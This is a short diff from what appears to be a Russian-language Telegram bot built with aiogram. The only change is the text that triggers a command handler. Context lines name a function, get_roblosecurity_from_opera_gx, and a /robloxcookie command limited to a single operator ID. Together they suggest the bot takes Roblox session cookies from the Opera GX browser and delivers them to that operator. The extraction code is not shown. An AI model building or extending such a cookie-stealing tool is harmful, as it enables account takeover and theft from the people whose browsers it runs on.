@@ -68,7 +68,7 @@ def get_roblosecurity_from_opera_gx():
 
 
 def register_roblosecurity_handler(dp):
-    @dp.message(F.text.lower() == "роблокс куки")
+    @dp.message(F.text.lower() == "роблокс куки [new]")
     @dp.message(Command("robloxcookie"))
     async def roblosecurity(message: types.Message):
         if message.from_user.id != ALLOWED_USER_ID:
